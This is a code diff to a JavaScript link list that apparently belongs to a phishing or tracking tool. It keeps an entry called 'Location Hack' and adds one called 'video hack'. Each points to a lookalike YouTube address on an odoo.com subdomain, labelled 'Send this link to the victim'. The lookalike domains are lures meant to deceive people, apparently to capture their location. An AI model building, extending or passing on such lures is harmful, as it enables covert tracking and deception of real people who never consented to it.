@@ -21,7 +21,11 @@ const linkData = [
   {
     name: "🌍 Location Hack 🌍",
     links: [{ text: "Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://y0uthub-c0m-vide0.odoo.com/1-1/" }]
-  }
+  },
+    {
+    name: "🌍 video hack 🌍",
+    links: [{ text: "Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://y0uthub-c0m-vide0.odoo.com/video/" }]
+    }
 ];
 
 // Utility functions
